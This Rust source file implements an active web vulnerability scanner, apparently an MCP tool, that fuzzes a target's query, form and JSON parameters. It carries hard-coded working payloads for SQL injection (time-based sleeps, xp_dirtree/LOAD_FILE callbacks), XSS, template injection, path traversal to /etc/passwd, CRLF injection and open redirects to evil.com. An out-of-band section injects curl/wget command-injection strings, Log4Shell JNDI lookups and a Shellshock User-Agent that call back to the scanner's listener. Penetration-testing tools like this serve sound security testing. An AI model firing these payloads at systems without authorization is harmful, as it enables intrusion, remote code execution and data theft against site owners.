use super::source::ResolvedSource;
use super::{next_finding_id, Finding};
use crate::mcp::types::HandlerResult;
use std::collections::HashMap;

pub async fn handle_active_scan(params: &serde_json::Value) -> HandlerResult {
    // v0.3.8: scan an intercepted request OR a traffic-log entry OR an explicit
    // target. When a source is given we inherit method + headers + body and
    // also fuzz body parameters (JSON object keys + form-urlencoded fields) in
    // addition to query parameters — that's the bug the user hit: form-encoded
    // login bodies were never being attacked.
    let source = super::source::resolve(params).await?;
    let target = source.url.clone();
    let target = target.as_str();

    let scan_types: Vec<String> = params["scan_types"]
        .as_array()
        .map(|arr| arr.iter().filter_map(|v| v.as_str().map(String::from)).collect())
        .unwrap_or_else(|| vec!["all".into()]);

    let max_payloads = params["max_payloads_per_type"].as_u64().unwrap_or(25) as usize;
    let max_concurrent = params["max_concurrent"].as_u64().unwrap_or(5) as usize;
    let timeout_secs = params["timeout_secs"].as_u64().unwrap_or(15);

    let scan_all = scan_types.contains(&"all".into());

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(timeout_secs))
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::none()) // Don't follow redirects for active scanning
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 WonderSuite/1.0")
        .build()
        .map_err(|e| format!("Client error: {}", e))?;

    // Build the unified injection-point list: query parameters + body
    // parameters (form-urlencoded + top-level JSON object keys).
    let injection_points = collect_injection_points(&source);
    // Backward-compat alias for the existing loops below.
    let params_list: Vec<(String, String)> =
        injection_points.iter().map(|p| (p.name.clone(), p.original_value.clone())).collect();

    let start = std::time::Instant::now();
    let baseline = match source.builder(&client, target).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            let time = start.elapsed().as_millis() as u64;
            Baseline { status, body_len: body.len(), body, time_ms: time }
        }
        Err(e) => return Err(format!("Cannot reach target: {}", e)),
    };

    let mut all_findings: Vec<Finding> = Vec::new();
    let mut scan_stats: HashMap<String, ScanTypeStats> = HashMap::new();

    if scan_all || scan_types.iter().any(|s| s == "sqli") {
        let mut stats = ScanTypeStats::default();
        let payloads = load_payloads("sqli", max_payloads);

        for (param_name, _param_value) in &params_list {
            for payload in &payloads {
                stats.requests += 1;
                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);

                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                    let body = resp.text().await.unwrap_or_default();

                    for (pattern, db_type) in SQL_ERROR_PATTERNS {
                        if body.contains(pattern) && !baseline.body.contains(pattern) {
                            stats.findings += 1;
                            all_findings.push(Finding {
                                id: next_finding_id(),
                                finding_type: "sqli_error".into(),
                                name: format!("SQL Injection — {} Error", db_type),
                                severity: "high".into(),
                                confidence: "certain".into(),
                                url: test_url.clone(),
                                parameter: Some(param_name.clone()),
                                payload: Some(payload.clone()),
                                evidence: extract_evidence(&body, pattern, 150),
                                detail: format!("The parameter '{}' appears vulnerable to SQL injection. A {} database error was triggered.", param_name, db_type),
                                remediation: "Use parameterized queries (prepared statements). Never concatenate user input into SQL.".into(),
                                request_info: None,
                            });
                            break;
                        }
                    }
                }
            }

            let time_payloads = [
                ("' OR SLEEP(3)-- -", 3000),
                ("'; WAITFOR DELAY '0:0:3'-- ", 3000),
                ("' OR pg_sleep(3)-- ", 3000),
            ];
            for (payload, expected_delay) in &time_payloads {
                stats.requests += 1;
                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
                let t_start = std::time::Instant::now();
                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                    let elapsed = t_start.elapsed().as_millis() as u64;
                    let _ = resp.text().await;
                    if elapsed >= *expected_delay && elapsed < (*expected_delay + 5000) {
                        let verify_payload = payload.replace('3', "0");
                        let (verify_url, verify_body) =
                            mutate(&source, &injection_points, param_name, &verify_payload);
                        let v_start = std::time::Instant::now();
                        if let Ok(v_resp) =
                            dispatch_req(&source, &client, &verify_url, &verify_body).send().await
                        {
                            let v_elapsed = v_start.elapsed().as_millis() as u64;
                            let _ = v_resp.text().await;
                            if v_elapsed < 2000 && elapsed > v_elapsed + 2000 {
                                stats.findings += 1;
                                all_findings.push(Finding {
                                    id: next_finding_id(),
                                    finding_type: "sqli_blind_time".into(),
                                    name: "SQL Injection — Time-Based Blind".into(),
                                    severity: "critical".into(),
                                    confidence: "firm".into(),
                                    url: test_url.clone(),
                                    parameter: Some(param_name.clone()),
                                    payload: Some(payload.to_string()),
                                    evidence: format!("Injected sleep caused {}ms delay (baseline: {}ms, verify: {}ms)", elapsed, baseline.time_ms, v_elapsed),
                                    detail: format!("Parameter '{}' is vulnerable to time-based blind SQL injection. The server delayed {}ms when a sleep was injected.", param_name, elapsed),
                                    remediation: "Use parameterized queries. Implement WAF rules.".into(),
                                    request_info: None,
                                });
                            }
                        }
                    }
                }
            }
        }
        scan_stats.insert("sqli".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "xss") {
        let mut stats = ScanTypeStats::default();
        let canary =
            format!("ws{}", uuid::Uuid::new_v4().to_string().replace('-', "").get(..8).unwrap_or("test1234"));

        for (param_name, _) in &params_list {
            stats.requests += 1;
            let (test_url, test_body) = mutate(&source, &injection_points, param_name, &canary);
            if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                let body = resp.text().await.unwrap_or_default();
                if body.contains(&canary) {
                    let xss_payloads = load_payloads("xss", max_payloads.min(15));
                    let context_payloads = vec![
                        format!("<{0}>", canary),
                        format!("\"><img src=x onerror=alert({})>", canary),
                        format!("'><script>{}</script>", canary),
                        format!("javascript:alert({})", canary),
                        format!("\" onfocus=alert({}) autofocus=\"", canary),
                        format!("<svg/onload=alert({})>", canary),
                    ];

                    let all_xss: Vec<String> =
                        context_payloads.into_iter().chain(xss_payloads.into_iter()).collect();

                    for payload in &all_xss {
                        stats.requests += 1;
                        let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
                        if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                            let resp_body = resp.text().await.unwrap_or_default();

                            if resp_body.contains(payload) {
                                stats.findings += 1;
                                all_findings.push(Finding {
                                    id: next_finding_id(),
                                    finding_type: "xss_reflected".into(),
                                    name: "Cross-Site Scripting (Reflected)".into(),
                                    severity: "high".into(),
                                    confidence: "certain".into(),
                                    url: test_url.clone(),
                                    parameter: Some(param_name.clone()),
                                    payload: Some(payload.clone()),
                                    evidence: extract_evidence(&resp_body, payload, 200),
                                    detail: format!("The parameter '{}' reflects user input without encoding. The XSS payload was found unmodified in the response.", param_name),
                                    remediation: "HTML-encode all user input before rendering. Use Content-Security-Policy.".into(),
                                    request_info: None,
                                });
                                break; // One confirmed XSS per param is enough
                            }

                            if payload.contains('<') && resp_body.contains(&format!("<{}", canary)) {
                                stats.findings += 1;
                                all_findings.push(Finding {
                                    id: next_finding_id(),
                                    finding_type: "xss_potential".into(),
                                    name: "Potential XSS — HTML Tags Reflected".into(),
                                    severity: "medium".into(),
                                    confidence: "firm".into(),
                                    url: test_url.clone(),
                                    parameter: Some(param_name.clone()),
                                    payload: Some(payload.clone()),
                                    evidence: extract_evidence(&resp_body, &format!("<{}", canary), 200),
                                    detail: format!("Parameter '{}' reflects HTML tags. While the exact payload may be filtered, the lack of encoding suggests XSS may be possible with bypass techniques.", param_name),
                                    remediation: "Implement context-aware output encoding.".into(),
                                    request_info: None,
                                });
                                break;
                            }
                        }
                    }
                }
            }
        }
        scan_stats.insert("xss".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "ssti") {
        let mut stats = ScanTypeStats::default();
        let ssti_probes = [
            ("{{7*7}}", "49", "Jinja2/Twig"),
            ("${7*7}", "49", "Freemarker/Velocity"),
            ("<%=7*7%>", "49", "ERB/EJS"),
            ("#{7*7}", "49", "Ruby/Pug"),
            ("{{7*'7'}}", "7777777", "Jinja2 (string multiply)"),
            ("${{7*7}}", "49", "Thymeleaf"),
            ("{7*7}", "49", "Smarty"),
        ];

        for (param_name, _) in &params_list {
            for (payload, expected, engine) in &ssti_probes {
                stats.requests += 1;
                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(expected) && !baseline.body.contains(expected) {
                        stats.findings += 1;
                        all_findings.push(Finding {
                            id: next_finding_id(),
                            finding_type: "ssti".into(),
                            name: format!("Server-Side Template Injection ({})", engine),
                            severity: "critical".into(),
                            confidence: "certain".into(),
                            url: test_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: extract_evidence(&body, expected, 150),
                            detail: format!("The template expression '{}' was evaluated server-side, producing '{}'. This indicates {} template injection, which can lead to Remote Code Execution.", payload, expected, engine),
                            remediation: "Never pass user input to template engines. Use sandboxed template rendering.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
        scan_stats.insert("ssti".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "lfi") {
        let mut stats = ScanTypeStats::default();
        let lfi_payloads = [
            ("../../../../etc/passwd", "root:x:", "Unix /etc/passwd"),
            ("..\\..\\..\\..\\windows\\win.ini", "[fonts]", "Windows win.ini"),
            ("....//....//....//etc/passwd", "root:x:", "Double-dot bypass"),
            ("/etc/passwd%00", "root:x:", "Null byte bypass"),
            ("php://filter/convert.base64-encode/resource=index", "PD", "PHP filter wrapper"),
            ("..%252f..%252f..%252fetc/passwd", "root:x:", "Double URL encode"),
            ("..%c0%af..%c0%af..%c0%afetc/passwd", "root:x:", "Unicode bypass"),
        ];

        for (param_name, _) in &params_list {
            for (payload, indicator, technique) in &lfi_payloads {
                stats.requests += 1;
                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                    let body = resp.text().await.unwrap_or_default();
                    if body.contains(indicator) && !baseline.body.contains(indicator) {
                        stats.findings += 1;
                        all_findings.push(Finding {
                            id: next_finding_id(),
                            finding_type: "lfi".into(),
                            name: format!("Local File Inclusion — {}", technique),
                            severity: "critical".into(),
                            confidence: "certain".into(),
                            url: test_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: extract_evidence(&body, indicator, 200),
                            detail: format!("The parameter '{}' is vulnerable to Local File Inclusion via {}. Sensitive file contents were returned.", param_name, technique),
                            remediation: "Use a whitelist for file paths. Never use user input directly in file operations.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
        scan_stats.insert("lfi".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "open_redirect") {
        let mut stats = ScanTypeStats::default();
        let redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%2F%2F",
            "////evil.com",
            "https:evil.com",
        ];

        let redirect_params = [
            "url",
            "redirect",
            "next",
            "return",
            "returnUrl",
            "redirect_uri",
            "continue",
            "dest",
            "destination",
            "go",
            "target",
            "rurl",
            "out",
        ];

        for (param_name, _) in &params_list {
            if redirect_params.iter().any(|rp| param_name.to_lowercase().contains(rp)) {
                for payload in &redirect_payloads {
                    stats.requests += 1;
                    let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
                    if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                        let status = resp.status().as_u16();
                        if (300..400).contains(&status) {
                            if let Some(loc) = resp.headers().get("location") {
                                let loc_str = loc.to_str().unwrap_or("");
                                if loc_str.contains("evil.com") {
                                    stats.findings += 1;
                                    all_findings.push(Finding {
                                        id: next_finding_id(),
                                        finding_type: "open_redirect".into(),
                                        name: "Open Redirect".into(),
                                        severity: "medium".into(),
                                        confidence: "certain".into(),
                                        url: test_url.clone(),
                                        parameter: Some(param_name.clone()),
                                        payload: Some(payload.to_string()),
                                        evidence: format!("Location: {}", loc_str),
                                        detail: format!("The parameter '{}' redirects to an attacker-controlled domain. This can be used for phishing attacks.", param_name),
                                        remediation: "Use a whitelist for redirect targets. Validate URLs server-side.".into(),
                                        request_info: None,
                                    });
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
        scan_stats.insert("open_redirect".into(), stats);
    }

    if scan_all || scan_types.iter().any(|s| s == "header_injection") {
        let mut stats = ScanTypeStats::default();
        let crlf_payloads = [
            "%0d%0aX-Injected: true",
            "%0aX-Injected: true",
            "\r\nX-Injected: true",
            "%E5%98%8A%E5%98%8DX-Injected: true",
        ];

        for (param_name, _) in &params_list {
            for payload in &crlf_payloads {
                stats.requests += 1;
                let (test_url, test_body) = mutate(&source, &injection_points, param_name, payload);
                if let Ok(resp) = dispatch_req(&source, &client, &test_url, &test_body).send().await {
                    let has_injected = resp.headers().contains_key("x-injected");
                    let _ = resp.text().await;
                    if has_injected {
                        stats.findings += 1;
                        all_findings.push(Finding {
                            id: next_finding_id(),
                            finding_type: "crlf_injection".into(),
                            name: "CRLF / Header Injection".into(),
                            severity: "high".into(),
                            confidence: "certain".into(),
                            url: test_url.clone(),
                            parameter: Some(param_name.clone()),
                            payload: Some(payload.to_string()),
                            evidence: "Response contains injected header: X-Injected: true".into(),
                            detail: format!("Parameter '{}' is vulnerable to CRLF injection. An attacker can inject arbitrary HTTP headers, potentially leading to XSS, cache poisoning, or session fixation.", param_name),
                            remediation: "Strip or encode CR/LF characters from user input before using in HTTP headers.".into(),
                            request_info: None,
                        });
                        break;
                    }
                }
            }
        }
        scan_stats.insert("header_injection".into(), stats);
    }

    // ── BLIND / OUT-OF-BAND (the killer chain) ───────────────────────────────
    // Auto-starts the OAST HTTP listener, injects blind SQLi / cmdi / SSRF /
    // log4shell payloads per parameter, then waits for callbacks. Every hit
    // becomes a critical finding because OAST callbacks are unambiguous.
    let with_oast = params["with_oast"].as_bool().unwrap_or(scan_all);
    if with_oast {
        let mut stats = ScanTypeStats::default();
        let oast_port = params["oast_port"].as_u64().unwrap_or(8888) as u16;
        match crate::oast::ensure_http_listener(oast_port).await {
            Err(e) => {
                eprintln!("[active_scan] OAST listener failed: {} — skipping OOB checks", e);
            }
            Ok(port) => {
                let host = crate::oast::callback_host();
                let server_domain = format!("{}:{}", host, port);
                let baseline_len = crate::oast::get_interactions().lock().await.len();

                let mut payload_map: HashMap<String, (String, String)> = HashMap::new();

                // Payload templates take (callback_url, callback_host_port).
                // callback_url = http://<host>:<port>/<correlation_id> (path-correlated)
                // callback_host_port = <host>:<port> (for ldap://, nslookup, etc.)
                let kinds: &[(&str, fn(&str, &str) -> Vec<String>)] = &[
                    ("blind_cmdi", |cb_url, _hp| {
                        vec![
                            format!("; curl {} #", cb_url),
                            format!("| curl {} ", cb_url),
                            format!("`curl {}`", cb_url),
                            format!("$(curl {})", cb_url),
                            format!("; wget {} -O /dev/null #", cb_url),
                        ]
                    }),
                    ("blind_ssrf", |cb_url, _hp| {
                        vec![cb_url.to_string(), cb_url.replace("http://", "https://")]
                    }),
                    ("log4shell", |_cb_url, hp| {
                        vec![format!("${{jndi:ldap://{}/x}}", hp), format!("${{jndi:dns://{}/x}}", hp)]
                    }),
                    ("blind_sqli_dns", |_cb_url, hp| {
                        // UNC-path-style — only works if the target's DB can resolve `hp`
                        // (so DNS-based WS_OAST_HOST, not IP). Harmless on IP targets.
                        vec![
                            format!("' UNION SELECT LOAD_FILE('//{}/a')-- ", hp),
                            format!("'; EXEC xp_dirtree '//{}/'-- ", hp),
                        ]
                    }),
                ];

                for (param_name, _) in &params_list {
                    for (kind, mk_payloads) in kinds {
                        let p = crate::oast::generate_oast_payload(
                            &format!("active_scan {} on {}", kind, param_name),
                            &server_domain,
                        );
                        payload_map
                            .insert(p.correlation_id.clone(), (param_name.clone(), (*kind).to_string()));
                        for injection in mk_payloads(&p.callback_url, &server_domain) {
                            stats.requests += 1;
                            let (url, body) = mutate(&source, &injection_points, param_name, &injection);
                            let _ = dispatch_req(&source, &client, &url, &body).send().await;
                        }
                    }
                }

                // Shellshock probe (User-Agent header carrier). Replay the
                // source request shape but with an attacker User-Agent.
                let shellshock_p = crate::oast::generate_oast_payload("shellshock probe", &server_domain);
                payload_map
                    .insert(shellshock_p.correlation_id.clone(), ("User-Agent".into(), "shellshock".into()));
                let ua = format!("() {{ :; }}; /usr/bin/curl {}", shellshock_p.callback_url);
                let _ = dispatch_req(&source, &client, target, &source.body)
                    .header("User-Agent", ua)
                    .send()
                    .await;
                stats.requests += 1;

                let wait_ms = params["oast_wait_ms"].as_u64().unwrap_or(15000);
                tokio::time::sleep(std::time::Duration::from_millis(wait_ms)).await;

                let log = crate::oast::get_interactions().lock().await;
                for interaction in log.iter().skip(baseline_len) {
                    if let Some((param, kind)) = payload_map.get(&interaction.correlation_id) {
                        stats.findings += 1;
                        all_findings.push(Finding {
                            id: next_finding_id(),
                            finding_type: kind.clone(),
                            name: format!("OAST callback — {} on parameter '{}'", kind, param),
                            severity: "critical".into(),
                            confidence: "certain".into(),
                            url: target.into(),
                            parameter: Some(param.clone()),
                            payload: Some(format!(
                                "correlation_id={} interaction_id={}",
                                interaction.correlation_id, interaction.id
                            )),
                            evidence: format!(
                                "{} callback from {} at {}",
                                interaction.interaction_type, interaction.source_ip, interaction.timestamp
                            ),
                            detail: format!(
                                "An OAST payload for parameter '{}' caused the target to make an out-of-band {} request to our listener. High-confidence proof of {} — input processed in a way that triggered external connections.",
                                param, interaction.interaction_type, kind
                            ),
                            remediation: format!(
                                "Validate and sanitize input for parameter '{}'. Restrict outbound network access from the application server.",
                                param
                            ),
                            request_info: None,
                        });
                    }
                }
            }
        }
        scan_stats.insert("blind_oast".into(), stats);
    }

    let total_requests: usize = scan_stats.values().map(|s| s.requests).sum();
    let total_findings = all_findings.len();

    let sev_order = |s: &str| -> u8 {
        match s {
            "critical" => 0,
            "high" => 1,
            "medium" => 2,
            "low" => 3,
            _ => 4,
        }
    };
    all_findings.sort_by(|a, b| sev_order(&a.severity).cmp(&sev_order(&b.severity)));

    let mut severity_counts: HashMap<String, usize> = HashMap::new();
    for f in &all_findings {
        *severity_counts.entry(f.severity.clone()).or_insert(0) += 1;
    }

    let body_points = injection_points.iter().filter(|p| p.location != InjLoc::Query).count();
    let query_points = injection_points.iter().filter(|p| p.location == InjLoc::Query).count();

    Ok(serde_json::json!({
        "target": target,
        "baseline": {
            "status": baseline.status,
            "body_length": baseline.body_len,
            "response_time_ms": baseline.time_ms,
        },
        "injection_points": injection_points.len(),
        "injection_points_breakdown": {
            "query": query_points,
            "body": body_points,
        },
        "source": {
            "origin": source.origin,
            "method": source.method,
            "had_body": !source.body.is_empty(),
            "header_count": source.headers.len(),
        },
        "scan_types": scan_stats.keys().collect::<Vec<_>>(),
        "total_requests": total_requests,
        "total_findings": total_findings,
        "findings_by_severity": severity_counts,
        "scan_stats": scan_stats,
        "findings": all_findings,
    }))
}

struct Baseline {
    status: u16,
    body_len: usize,
    body: String,
    time_ms: u64,
}

#[derive(Debug, Clone, Default, serde::Serialize)]
struct ScanTypeStats {
    requests: usize,
    findings: usize,
}

const SQL_ERROR_PATTERNS: &[(&str, &str)] = &[
    ("You have an error in your SQL syntax", "MySQL"),
    ("mysql_fetch_array()", "MySQL"),
    ("Warning: mysql_", "MySQL"),
    ("MySqlException", "MySQL"),
    ("com.mysql.jdbc", "MySQL"),
    ("pg_query()", "PostgreSQL"),
    ("PSQLException", "PostgreSQL"),
    ("ERROR:  syntax error at or near", "PostgreSQL"),
    ("unterminated quoted string", "PostgreSQL"),
    ("Unclosed quotation mark", "MSSQL"),
    ("Microsoft OLE DB Provider", "MSSQL"),
    ("ODBC SQL Server Driver", "MSSQL"),
    ("SqlException", "MSSQL"),
    ("mssql_query()", "MSSQL"),
    ("ORA-00933", "Oracle"),
    ("ORA-01756", "Oracle"),
    ("ORA-06512", "Oracle"),
    ("quoted string not properly terminated", "Oracle"),
    ("SQLITE_ERROR", "SQLite"),
    ("near \"%s\": syntax error", "SQLite"),
    ("unrecognized token", "SQLite"),
    ("SQL syntax.*?MySQL", "MySQL"),
    ("valid MySQL result", "MySQL"),
    ("SQLSTATE[", "Generic SQL"),
    ("HY000", "Generic SQL"),
];

/// v0.3.8: an injection point is either a query-string parameter, a form-
/// encoded body field, or a top-level JSON-object key. The active scanner
/// fuzzes ALL three locations now — previously body params were unreachable.
#[derive(Debug, Clone)]
pub(super) struct InjectionPoint {
    pub name: String,
    pub original_value: String,
    pub location: InjLoc,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum InjLoc {
    Query,
    BodyForm,
    BodyJson,
}

/// Build the unified injection-point list from a ResolvedSource. Order:
/// query params first (existing behavior), then body params. Body params are
/// only included if the source has a body and the content-type indicates a
/// parameterized payload (form / json).
pub(super) fn collect_injection_points(source: &ResolvedSource) -> Vec<InjectionPoint> {
    let mut points = Vec::new();
    if let Ok(parsed) = url::Url::parse(&source.url) {
        for (k, v) in parsed.query_pairs() {
            points.push(InjectionPoint {
                name: k.into_owned(),
                original_value: v.into_owned(),
                location: InjLoc::Query,
            });
        }
    }
    if !source.body.is_empty() {
        let ctype = source
            .headers
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
            .map(|(_, v)| v.to_ascii_lowercase())
            .unwrap_or_default();
        let looks_json = ctype.contains("json")
            || source.body.trim_start().starts_with('{')
            || source.body.trim_start().starts_with('[');
        let looks_form = ctype.contains("x-www-form-urlencoded")
            || (!looks_json && source.body.contains('=') && !source.body.contains('\n'));
        if looks_json {
            if let Ok(v) = serde_json::from_str::<serde_json::Value>(&source.body) {
                if let Some(obj) = v.as_object() {
                    for (k, val) in obj {
                        points.push(InjectionPoint {
                            name: k.clone(),
                            original_value: match val {
                                serde_json::Value::String(s) => s.clone(),
                                _ => val.to_string(),
                            },
                            location: InjLoc::BodyJson,
                        });
                    }
                }
            }
        }
        if looks_form {
            for (k, v) in super::source::parse_form_body(&source.body) {
                points.push(InjectionPoint { name: k, original_value: v, location: InjLoc::BodyForm });
            }
        }
    }
    points
}

/// Mutate URL and body for a payload at the given parameter — returns
/// (test_url, test_body). For query points the URL is mutated and the body is
/// untouched; for body points the URL stays the same and the body is rewritten
/// in place. Falls back to URL replace if the parameter isn't in the
/// injection-point list (preserves old behavior on unknown names).
pub(super) fn mutate(
    source: &ResolvedSource,
    points: &[InjectionPoint],
    param_name: &str,
    payload: &str,
) -> (String, String) {
    let point = points.iter().find(|p| p.name == param_name);
    match point.map(|p| p.location) {
        Some(InjLoc::BodyForm) => {
            (source.url.clone(), super::source::replace_form_param(&source.body, param_name, payload))
        }
        Some(InjLoc::BodyJson) => {
            (source.url.clone(), super::source::replace_json_param(&source.body, param_name, payload))
        }
        Some(InjLoc::Query) | None => {
            (replace_query_param(&source.url, param_name, payload), source.body.clone())
        }
    }
}

/// Build a RequestBuilder for an attack probe. Preserves method + headers +
/// (mutated) body from the source so the probe replays cookies, auth,
/// content-type etc. exactly.
pub(super) fn dispatch_req(
    source: &ResolvedSource,
    client: &reqwest::Client,
    test_url: &str,
    test_body: &str,
) -> reqwest::RequestBuilder {
    let method = reqwest::Method::from_bytes(source.method.as_bytes()).unwrap_or(reqwest::Method::GET);
    let mut req = client.request(method, test_url);
    const STRIP: &[&str] = &["host", "content-length", "connection", "transfer-encoding", "accept-encoding"];
    for (k, v) in &source.headers {
        if STRIP.iter().any(|s| k.eq_ignore_ascii_case(s)) {
            continue;
        }
        req = req.header(k.as_str(), v.as_str());
    }
    if !test_body.is_empty() {
        req = req.body(test_body.to_string());
    }
    req
}

/// URL-only query-string mutation (renamed from `replace_param` — kept for the
/// open-redirect / OAST scan-types that target query strings specifically).
pub(super) fn replace_query_param(url: &str, param_name: &str, new_value: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed
            .query_pairs()
            .map(|(k, v)| {
                if k == param_name {
                    (k.to_string(), new_value.to_string())
                } else {
                    (k.to_string(), v.to_string())
                }
            })
            .collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in &pairs {
            parsed.query_pairs_mut().append_pair(k, v);
        }
        parsed.to_string()
    } else {
        url.to_string()
    }
}

fn load_payloads(category: &str, limit: usize) -> Vec<String> {
    let mut mgr = crate::mcp::handlers::payloads::manager();
    mgr.load(category).unwrap_or_default().into_iter().take(limit).collect()
}

fn extract_evidence(body: &str, needle: &str, context: usize) -> String {
    if let Some(pos) = body.find(needle) {
        let start = pos.saturating_sub(context / 2);
        let end = (pos + needle.len() + context / 2).min(body.len());
        let snippet = &body[start..end];
        format!("...{}...", snippet.replace('\n', "\\n").replace('\r', ""))
    } else {
        format!("Pattern '{}' found in response", needle)
    }
}
